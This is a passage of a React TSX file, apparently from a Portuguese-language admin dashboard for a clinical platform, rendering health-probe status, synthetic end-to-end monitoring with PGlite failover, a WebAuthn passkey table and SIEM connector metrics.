                <p className="font-bold text-sm text-slate-900 dark:text-white font-mono">
                  Bun v{livenessProbe?.system.bunVersion || '1.4'}
                </p>
                <p className="text-[10px] text-slate-500 font-mono">{livenessProbe?.system.platform} ({livenessProbe?.system.arch})</p>
              </div>
            </div>

            {/* Sondas Ativas de Dependências (Readiness Grid) */}
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
                  Dependências Avaliadas pelo Readiness Probe ({readinessProbe?.summary.healthy || 0}/{readinessProbe?.summary.total || 0} Saudáveis)
                </h3>
                <span className="text-[10px] text-slate-400 font-mono">
                  Último check: {readinessProbe?.timestamp ? new Date(readinessProbe.timestamp).toLocaleTimeString('pt-BR') : 'agora'}
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                {readinessProbe && Object.entries(readinessProbe.checks).map(([key, check]) => {
                  const isHealthy = check.status === 'healthy';
                  const isDegraded = check.status === 'degraded';
                  return (
                    <div 
                      key={key}
                      className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/30 border border-slate-200 dark:border-slate-700/80 space-y-2 hover:border-slate-300 dark:hover:border-slate-600 transition-colors"
                    >
                      <div className="flex items-center justify-between gap-2">
                        <div className="flex items-center gap-2">
                          <span className={`w-2 h-2 rounded-full ${
                            isHealthy ? 'bg-emerald-500' : isDegraded ? 'bg-amber-500' : 'bg-rose-500'
                          }`} />
                          <span className="font-semibold text-xs text-slate-900 dark:text-white">
                            {check.name}
                          </span>
                        </div>

                        <div className="flex items-center gap-1.5">
                          <span className="font-mono text-[10px] text-slate-500">
                            {check.latencyMs.toFixed(1)}ms
                          </span>
                          <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${
                            isHealthy 
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
                              : isDegraded
                                ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300'
                                : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300'
                          }`}>
                            {check.status.toUpperCase()}
                          </span>
                        </div>
                      </div>

                      <p className="text-[11px] text-slate-600 dark:text-slate-400 leading-relaxed">
                        {check.message}
                      </p>

                      {check.details && (
                        <div className="pt-1.5 border-t border-slate-200/60 dark:border-slate-700/60 flex flex-wrap gap-2 text-[10px] font-mono text-slate-500">
                          {Object.entries(check.details).map(([k, v]) => (
                            <span key={k} className="bg-white/80 dark:bg-slate-800 px-1.5 py-0.5 rounded border border-slate-200/50 dark:border-slate-700">
                              {k}: <strong className="text-slate-700 dark:text-slate-300">{String(v)}</strong>
                            </span>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Informações da Sonda de Startup */}
            {startupProbe && (
              <div className="p-4 rounded-2xl bg-teal-50/50 dark:bg-teal-950/20 border border-teal-200/60 dark:border-teal-800/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                <div className="flex items-center gap-2.5">
                  <div className="p-1.5 rounded-xl bg-teal-500/10 text-teal-600 dark:text-teal-400">
                    <Server className="w-4 h-4" />
                  </div>
                  <div>
                    <span className="font-bold text-teal-950 dark:text-teal-200">Startup Probe Concluído:</span>
                    <span className="text-teal-800/90 dark:text-teal-300/90 ml-1.5">
                      Driver: <strong className="font-mono">{startupProbe.databaseDriver}</strong> • Inicialização em <strong className="font-mono">{startupProbe.bootstrapDurationMs}ms</strong>
                    </span>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <span className="px-2.5 py-0.5 rounded-full bg-teal-100 text-teal-800 dark:bg-teal-900/60 dark:text-teal-300 text-[10px] font-bold font-mono">
                    HTTP 200 OK
                  </span>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Card 6: Monitoramento Sintético, Testes E2E & Validação da Jornada Clínica (Opção M - RFC-001) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div>
            <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Workflow className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
              Monitoramento Sintético & Testes E2E • RFC-001 Opção M
            </h2>
            <p className="text-xs text-slate-600 dark:text-slate-400 mt-1">
              Sondas ativas simulando o ciclo completo do paciente (Landing Page ➔ 2FA ➔ Webhooks ➔ Transcrição & SOAP IA ➔ DDM ➔ Laudo CFP & ICP ➔ WORM) com verificação de resiliência PGlite.
            </p>
          </div>

          {currentUser.role === UserRole.ADMIN && (
            <div className="flex flex-wrap items-center gap-2">
              <select
                value={selectedScenario}
                onChange={(e) => setSelectedScenario(e.target.value as any)}
                className="px-3 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-700 dark:text-slate-200"
              >
                <option value="full_clinical_journey">Jornada Clínica Completa E2E (8 Passos)</option>
                <option value="resilience_only">Apenas Resiliência & Fallback PGlite</option>
              </select>

              <button
                onClick={() => handleRunSyntheticProbe(selectedScenario)}
                disabled={loadingSynthetic}
                className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-all cursor-pointer disabled:opacity-50"
              >
                <Play className={`w-3.5 h-3.5 fill-current ${loadingSynthetic ? 'animate-spin' : ''}`} />
                <span>{loadingSynthetic ? 'Executando Sonda...' : 'Disparar Probe Sintético Agora'}</span>
              </button>
            </div>
          )}
        </div>

        {currentUser.role !== UserRole.ADMIN ? (
          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 text-xs text-slate-500 dark:text-slate-400 flex items-center gap-3">
            <Lock className="w-4 h-4 text-slate-400 shrink-0" />
            <span>
              A execução de sondas sintéticas e validação de resiliência é restrita ao perfil <strong>Administrador TI / DPO</strong>.
            </span>
          </div>
        ) : (
          <div className="space-y-6">
            {/* Visão Geral da Última Execução */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
              {/* Status do Probe */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Resultado Global</span>
                <div className="flex items-center gap-2">
                  <span className={`w-2.5 h-2.5 rounded-full ${
                    syntheticResult?.status === 'passed'
                      ? 'bg-emerald-500 animate-pulse'
                      : syntheticResult?.status === 'partial'
                        ? 'bg-amber-500'
                        : 'bg-rose-500'
                  }`} />
                  <span className="font-bold text-sm text-slate-900 dark:text-white capitalize">
                    {syntheticResult?.status === 'passed' ? '100% Validado' : syntheticResult?.status === 'partial' ? 'Parcial' : syntheticResult?.status ? 'Falhou' : 'Aguardando'}
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 font-mono truncate">
                  {syntheticResult?.executionId || 'Nenhum probe executado'}
                </p>
              </div>

              {/* Passos Concluídos */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Passos Validados</span>
                <p className="font-bold text-sm text-slate-900 dark:text-white font-mono">
                  {syntheticResult?.summary.passed || 0}/{syntheticResult?.summary.total || 0} Passos OK
                </p>
                <p className="text-[10px] text-emerald-600 dark:text-emerald-400 font-semibold">
                  {syntheticResult?.status === 'passed' ? 'Conformidade RFC-001' : 'Pendente de validação'}
                </p>
              </div>

              {/* Latência Total E2E */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Tempo de Execução (E2E)</span>
                <p className="font-bold text-sm text-slate-900 dark:text-white font-mono">
                  {syntheticResult?.totalDurationMs || 0} ms
                </p>
                <p className="text-[10px] text-slate-500 font-mono">
                  Gatilho: {syntheticResult?.trigger || 'manual'}
                </p>
              </div>

              {/* Resiliência PGlite */}
              <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-700 space-y-1">
                <span className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Resiliência PGlite</span>
                <p className="font-bold text-sm text-teal-600 dark:text-teal-400 font-mono">
                  {resilienceResult?.pgliteOperational ? 'WASM Operacional' : 'Inativo'}
                </p>
                <p className="text-[10px] text-slate-500 font-mono">
                  Failover: {resilienceResult?.failoverLatencyMs || 0}ms
                </p>
              </div>
            </div>

            {/* Box Especial de Tolerância a Falhas & Resiliência PGlite */}
            <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-teal-500/10 via-emerald-500/10 to-transparent border border-teal-200/80 dark:border-teal-800/60 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div className="flex items-start gap-3">
                <div className="p-2 rounded-xl bg-teal-500/10 text-teal-600 dark:text-teal-400 shrink-0 mt-0.5">
                  <Database className="w-5 h-5" />
                </div>
                <div className="space-y-1">
                  <h4 className="text-xs font-bold text-slate-900 dark:text-white flex items-center gap-2">
                    Arquitetura Tolerante a Falhas: Contingência PGlite WASM
                    <span className="px-2 py-0.5 rounded-full text-[9px] font-bold bg-teal-100 text-teal-800 dark:bg-teal-900/60 dark:text-teal-300 font-mono">
                      RFC §5.2
                    </span>
                  </h4>
                  <p className="text-[11px] text-slate-600 dark:text-slate-400 leading-relaxed max-w-2xl">
                    Em caso de blackout de rede ou falha no PostgreSQL externo/Supabase, a plataforma ativa o fallback automático para o motor PGlite embutido (PostgreSQL 16 compilado em WebAssembly), preservando o schema de 7 tabelas e a gravação de prontuários com zero tempo de inatividade.
                  </p>
                </div>
              </div>

              <div className="flex sm:flex-col items-end gap-1.5 shrink-0 text-right">
                <span className="text-[10px] text-slate-400 font-medium">Tabelas Relacionais Prontas:</span>
                <span className="px-2 py-0.5 rounded-lg bg-teal-100 text-teal-800 dark:bg-teal-900/80 dark:text-teal-200 font-mono text-[11px] font-bold">
                  {resilienceResult?.schemaTableCount || 7} / 7 Tabelas
                </span>
              </div>
            </div>

            {/* Linha do Tempo dos Passos da Jornada Sintética */}
            {syntheticResult && (
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
                    Etapas da Jornada Clínica Sintética ({syntheticResult.steps.length} Verificações)
                  </h3>
                  <span className="text-[10px] text-slate-400 font-mono">
                    Concluído em: {new Date(syntheticResult.completedAt).toLocaleTimeString('pt-BR')}
                  </span>
                </div>

                <div className="space-y-2.5">
                  {syntheticResult.steps.map((step, idx) => {
                    const isPassed = step.status === 'passed';
                    return (
                      <div
                        key={step.id}
                        className="p-3.5 sm:p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700/80 hover:border-slate-300 dark:hover:border-slate-600 transition-colors space-y-2"
                      >
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1">
                          <div className="flex items-center gap-2.5">
                            <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold ${
                              isPassed 
                                ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-900/60 dark:text-emerald-300'
                                : 'bg-rose-100 text-rose-800 dark:bg-rose-900/60 dark:text-rose-300'
                            }`}>
                              {idx + 1}
                            </span>
                            <span className="text-xs font-semibold text-slate-900 dark:text-white">
                              {step.name}
                            </span>
                          </div>

                          <div className="flex items-center gap-2 self-end sm:self-auto">
                            <span className="font-mono text-[10px] text-slate-500">
                              {step.durationMs}ms
                            </span>
                            <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold font-mono ${
                              isPassed
                                ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
                                : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300'
                            }`}>
                              {step.status.toUpperCase()}
                            </span>
                          </div>
                        </div>

                        <p className="text-[11px] text-slate-600 dark:text-slate-400 leading-relaxed pl-7">
                          {step.description}
                        </p>

                        {step.error && (
                          <div className="ml-7 p-2 rounded-xl bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-800 text-[11px] text-rose-700 dark:text-rose-300">
                            Erro: {step.error}
                          </div>
                        )}

                        {step.details && (
                          <div className="ml-7 pt-1.5 border-t border-slate-200/50 dark:border-slate-700/50 flex flex-wrap gap-1.5 text-[10px] font-mono text-slate-500">
                            {Object.entries(step.details).map(([k, v]) => (
                              <span key={k} className="bg-white dark:bg-slate-800 px-2 py-0.5 rounded border border-slate-200 dark:border-slate-700">
                                {k}: <strong className="text-slate-700 dark:text-slate-300">{typeof v === 'object' ? JSON.stringify(v) : String(v)}</strong>
                              </span>
                            ))}
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* Histórico Recente de Probes */}
            {syntheticHistory.length > 1 && (
              <div className="space-y-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
                  Histórico de Execuções Recentes ({syntheticHistory.length} Registros)
                </h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs text-slate-600 dark:text-slate-300">
                    <thead className="text-[10px] uppercase text-slate-400 border-b border-slate-200 dark:border-slate-800">
                      <tr>
                        <th className="py-2 pr-4">ID da Execução</th>
                        <th className="py-2 pr-4">Data / Hora</th>
                        <th className="py-2 pr-4">Cenário</th>
                        <th className="py-2 pr-4">Passos Validados</th>
                        <th className="py-2 pr-4">Duração</th>
                        <th className="py-2 text-right">Status</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-100 dark:divide-slate-800 font-mono text-[11px]">
                      {syntheticHistory.slice(0, 5).map((h) => (
                        <tr key={h.executionId} className="hover:bg-slate-50 dark:hover:bg-slate-800/40">
                          <td className="py-2 pr-4 font-bold text-slate-900 dark:text-white">
                            {h.executionId.slice(0, 12)}...
                          </td>
                          <td className="py-2 pr-4 text-slate-500">
                            {new Date(h.completedAt).toLocaleString('pt-BR')}
                          </td>
                          <td className="py-2 pr-4 text-slate-500">
                            {h.scenario}
                          </td>
                          <td className="py-2 pr-4 text-slate-500">
                            {h.summary.passed}/{h.summary.total}
                          </td>
                          <td className="py-2 pr-4 text-slate-500">
                            {h.totalDurationMs}ms
                          </td>
                          <td className="py-2 text-right">
                            <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${
                              h.status === 'passed'
                                ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
                                : 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300'
                            }`}>
                              {h.status.toUpperCase()}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Card 7: Autenticação Biométrica WebAuthn / Passkeys (FIDO2 / TouchID / FaceID - RFC-001 Opção O & LGPD Art. 46) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-6 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-start sm:items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-violet-600 to-indigo-600 flex items-center justify-center text-white font-bold text-lg shadow-md shadow-violet-500/20 shrink-0">
              <Fingerprint className="w-6 h-6 text-white" />
            </div>
            <div>
              <div className="flex flex-wrap items-center gap-2">
                <h3 className="text-base font-bold text-slate-900 dark:text-white">
                  Autenticação Biométrica WebAuthn / Passkeys • RFC-001 Opção O
                </h3>
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-violet-100 dark:bg-violet-950/60 text-violet-800 dark:text-violet-300 border border-violet-300 dark:border-violet-700">
                  FIDO2 / Level 3
                </span>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                  LGPD Art. 46
                </span>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 mt-1 max-w-3xl leading-relaxed">
                Autenticação sem senha (passwordless) e segundo fator resistente a phishing com chaves assimétricas 
                ECDSA P-256 geradas no enclave de segurança (Apple TouchID / FaceID, Windows Hello ou YubiKey). 
                Validação de signCount anti-clonagem e auditoria imutável WORM.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            <button
              onClick={() => setShowAddPasskeyModal(true)}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-violet-600 hover:bg-violet-700 text-white text-xs font-semibold shadow-sm transition-all active:scale-95 cursor-pointer"
            >
              <Plus className="w-4 h-4" />
              <span>Cadastrar Nova Passkey</span>
            </button>
            <button
              onClick={handleTestBiometricLogin}
              disabled={testingPasskey || passkeys.length === 0}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 text-xs font-semibold transition-all active:scale-95 cursor-pointer disabled:opacity-50"
              title={passkeys.length === 0 ? 'Cadastre uma passkey para testar o login biométrico' : 'Testar verificação biométrica'}
            >
              {testingPasskey ? <RefreshCw className="w-4 h-4 animate-spin text-violet-500" /> : <KeyRound className="w-4 h-4 text-violet-500" />}
              <span>Testar Autenticação</span>
            </button>
            <button
              onClick={fetchPasskeys}
              disabled={loadingPasskeys}
              className="p-2 rounded-xl border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300 transition-colors cursor-pointer"
              title="Atualizar lista de Passkeys"
            >
              <RefreshCw className={`w-4 h-4 ${loadingPasskeys ? 'animate-spin' : ''}`} />
            </button>
          </div>
        </div>

        {/* Status do Hardware Biométrico */}
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200/80 dark:border-slate-800">
          <div className="flex items-center gap-2 text-xs">
            {isWebAuthnSupported ? (
              <>
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span className="text-slate-700 dark:text-slate-300 font-medium">
                  Hardware biométrico e API WebAuthn detectados no navegador.
                </span>
              </>
            ) : (
              <>
                <AlertCircle className="w-4 h-4 text-sky-500 shrink-0" />
                <span className="text-slate-700 dark:text-slate-300 font-medium">
                  Navegador sem suporte direto a WebAuthn; modo de compatibilidade/simulação ativo.
                </span>
              </>
            )}
          </div>
          <div className="text-[11px] font-mono text-slate-500 dark:text-slate-400">
            {passkeys.length} {passkeys.length === 1 ? 'chave ativa' : 'chaves ativas'}
          </div>
        </div>

        {/* Lista de Passkeys Cadastradas */}
        {loadingPasskeys && passkeys.length === 0 ? (
          <div className="py-8 flex flex-col items-center justify-center gap-2 text-slate-400 text-xs">
            <RefreshCw className="w-5 h-5 animate-spin text-violet-500" />
            <span>Carregando credenciais FIDO2...</span>
          </div>
        ) : passkeys.length === 0 ? (
          <div className="p-6 rounded-2xl border border-dashed border-slate-300 dark:border-slate-700 bg-slate-50/50 dark:bg-slate-800/20 text-center space-y-3">
            <div className="w-10 h-10 rounded-full bg-violet-100 dark:bg-violet-950/60 text-violet-600 dark:text-violet-400 flex items-center justify-center mx-auto">
              <Fingerprint className="w-5 h-5" />
            </div>
            <div>
              <p className="text-sm font-semibold text-slate-800 dark:text-slate-200">
                Nenhuma Passkey Biométrica Cadastrada
              </p>
              <p className="text-xs text-slate-500 dark:text-slate-400 max-w-md mx-auto mt-1">
                Adicione o TouchID do seu computador, FaceID do smartphone ou uma chave FIDO2 física para acessar sua conta de terapeuta com um único toque.
              </p>
            </div>
            <button
              onClick={() => setShowAddPasskeyModal(true)}
              className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl bg-violet-600 hover:bg-violet-700 text-white text-xs font-semibold transition-all cursor-pointer shadow-sm"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Cadastrar Minha Primeira Passkey</span>
            </button>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs text-slate-600 dark:text-slate-300">
              <thead className="text-[10px] uppercase text-slate-400 border-b border-slate-200 dark:border-slate-800">
                <tr>
                  <th className="py-2.5 pr-4">Dispositivo</th>
                  <th className="py-2.5 pr-4">Identificador da Credencial</th>
                  <th className="py-2.5 pr-4">Algoritmo</th>
                  <th className="py-2.5 pr-4">Cadastrada em</th>
                  <th className="py-2.5 pr-4">Sign Count</th>
                  <th className="py-2.5 pr-4">Último Acesso</th>
                  <th className="py-2.5 text-right">Ação</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                {passkeys.map((p) => {
                  const isMulti = p.deviceType === 'multiDevice';
                  return (
                    <tr key={p.id} className="hover:bg-slate-50/80 dark:hover:bg-slate-800/40 transition-colors">
                      <td className="py-3 pr-4">
                        <div className="flex items-center gap-2.5">
                          <div className="w-8 h-8 rounded-lg bg-violet-100 dark:bg-violet-950/60 text-violet-600 dark:text-violet-400 flex items-center justify-center shrink-0">
                            {isMulti ? <Laptop className="w-4 h-4" /> : <Key className="w-4 h-4" />}
                          </div>
                          <div>
                            <span className="font-semibold text-slate-900 dark:text-white block">
                              {p.friendlyName}
                            </span>
                            <span className="text-[10px] text-slate-400">
                              {isMulti ? 'Sincronizada (iCloud / Google Password Mgr)' : 'Hardware Dedicado (Secure Enclave / TPM)'}
                            </span>
                          </div>
                        </div>
                      </td>
                      <td className="py-3 pr-4 font-mono text-[11px] text-slate-500">
                        {p.credentialId.slice(0, 16)}...
                      </td>
                      <td className="py-3 pr-4">
                        <span className="px-2 py-0.5 rounded-full text-[10px] font-bold font-mono bg-indigo-50 dark:bg-indigo-950/40 text-indigo-700 dark:text-indigo-300 border border-indigo-200 dark:border-indigo-800">
                          ES256 (P-256)
                        </span>
                      </td>
                      <td className="py-3 pr-4 text-slate-500 text-[11px]">
                        {new Date(p.createdAt).toLocaleDateString('pt-BR')}
                      </td>
                      <td className="py-3 pr-4">
                        <span className="font-mono text-[11px] font-bold text-slate-700 dark:text-slate-300">
                          {p.counter}
                        </span>
                      </td>
                      <td className="py-3 pr-4 text-slate-500 text-[11px]">
                        {p.lastUsedAt ? new Date(p.lastUsedAt).toLocaleString('pt-BR') : 'Nunca'}
                      </td>
                      <td className="py-3 text-right">
                        <button
                          onClick={() => handleDeletePasskey(p.id, p.friendlyName)}
                          className="p-1.5 rounded-lg text-slate-400 hover:text-rose-600 dark:hover:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/40 transition-colors cursor-pointer"
                          title="Revogar esta Passkey"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Card 8: Conectores SIEM Externos (Datadog, Splunk, Elastic) & Retry Resiliente com DLQ (RFC §4.4 & §5.2) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 sm:p-8 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-6 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-start sm:items-center gap-4">
            <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-sky-600 to-cyan-600 flex items-center justify-center text-white font-bold text-lg shadow-md shadow-sky-500/20 shrink-0">
              <Radio className="w-6 h-6 text-white" />
            </div>
            <div>
              <div className="flex flex-wrap items-center gap-2">
                <h3 className="text-base font-bold text-slate-900 dark:text-white">
                  Conectores SIEM Externos (Datadog, Splunk, Elastic) & Retry Resiliente
                </h3>
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-sky-100 dark:bg-sky-950/60 text-sky-800 dark:text-sky-300 border border-sky-300 dark:border-sky-700">
                  RFC §4.4 & §5.2
                </span>
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                  LGPD Art. 48
                </span>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 mt-1 max-w-3xl leading-relaxed">
                Encaminhamento contínuo e adaptativo de eventos da trilha de auditoria para plataformas enterprise SIEM/SOC. 
                Proteção com Circuit Breaker, reenvio com Exponential Backoff (±20% Jitter) e desvio seguro para Dead-Letter Queue (DLQ).
              </p>
            </div>
          </div>

          {currentUser.role === UserRole.ADMIN && (
            <div className="flex flex-wrap items-center gap-2.5">
              <button
                onClick={() => setShowCreateSiemModal(true)}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-sky-600 hover:bg-sky-700 text-white text-xs font-semibold shadow-sm transition-all active:scale-95 cursor-pointer"
              >
                <Plus className="w-4 h-4" />
                <span>Novo Conector SIEM</span>
              </button>

              <button
                onClick={fetchSiemData}
                disabled={loadingSiemConnectors}
                className="p-2 rounded-xl border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300 transition-colors cursor-pointer"
                title="Atualizar dados SIEM"
              >
                <RefreshCw className={`w-4 h-4 ${loadingSiemConnectors ? 'animate-spin' : ''}`} />
              </button>
            </div>
          )}
        </div>

        {/* KPIs SIEM */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Conectores Ativos</span>
            <div className="flex items-center gap-2 mt-1">
              <span className="text-xl font-bold text-slate-900 dark:text-white">
                {siemConnectors.filter(c => c.enabled).length}/{siemConnectors.length}
              </span>
              <span className="text-[10px] font-bold text-emerald-600 dark:text-emerald-400">Online</span>
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Entregas Confirmadas</span>
            <div className="flex items-center gap-2 mt-1">
              <span className="text-xl font-bold text-emerald-600 dark:text-emerald-400">
                {siemQueueStats?.deliveredCount ?? 0}
              </span>
              <span className="text-[10px] text-slate-400">eventos</span>
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Fila de Retry Ativa</span>
            <div className="flex items-center gap-2 mt-1">
              <span className="text-xl font-bold text-amber-600 dark:text-amber-400">
                {siemQueueStats?.retryingCount ?? 0}
              </span>
              <span className="text-[10px] text-slate-400">backoff agendado</span>
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700">
            <span className="text-[10px] text-slate-400 font-semibold uppercase block">Dead-Letter Queue (DLQ)</span>
            <div className="flex items-center gap-2 mt-1">
              <span className={`text-xl font-bold ${siemDlqItems.length > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-slate-900 dark:text-white'}`}>
                {siemDlqItems.length}
              </span>
              <span className="text-[10px] text-slate-400">retidos para revisão</span>
            </div>
          </div>
        </div>

        {/* Lista de Conectores SIEM */}
        <div className="space-y-4">
          <h4 className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
            Conectores SIEM Corporativos Registrados
          </h4>

          {siemConnectors.length === 0 ? (
            <div className="p-8 text-center text-xs text-slate-500 bg-slate-50 dark:bg-slate-800/30 rounded-2xl border border-slate-200 dark:border-slate-800">
              Nenhum conector SIEM configurado. Clique em "Novo Conector SIEM" para adicionar.
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {siemConnectors.map((c) => (
                <div 
                  key={c.id}
                  className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 flex flex-col justify-between space-y-4 hover:border-slate-300 dark:hover:border-slate-600 transition-all"
                >
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase font-mono ${
                        c.provider === 'datadog'
                          ? 'bg-purple-100 text-purple-800 dark:bg-purple-950/60 dark:text-purple-300 border border-purple-300 dark:border-purple-700'
                          : c.provider === 'splunk'
                          ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border border-amber-300 dark:border-amber-700'
                          : c.provider === 'elastic'
                          ? 'bg-teal-100 text-teal-800 dark:bg-teal-950/60 dark:text-teal-300 border border-teal-300 dark:border-teal-700'
                          : 'bg-slate-200 text-slate-800 dark:bg-slate-700 dark:text-slate-200'
                      }`}>
                        {c.provider.toUpperCase()}
                      </span>

                      {/* Badge Circuit Breaker */}
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                        c.circuitBreakerStatus === 'CLOSED'
                          ? 'bg-emerald-500/10 text-emerald-700 dark:text-emerald-300 border border-emerald-500/20'
                          : c.circuitBreakerStatus === 'HALF_OPEN'
                          ? 'bg-amber-500/10 text-amber-700 dark:text-amber-300 border border-amber-500/20'
                          : 'bg-rose-500/10 text-rose-700 dark:text-rose-300 border border-rose-500/20'
                      }`} title={`Circuit Breaker: ${c.circuitBreakerStatus}`}>
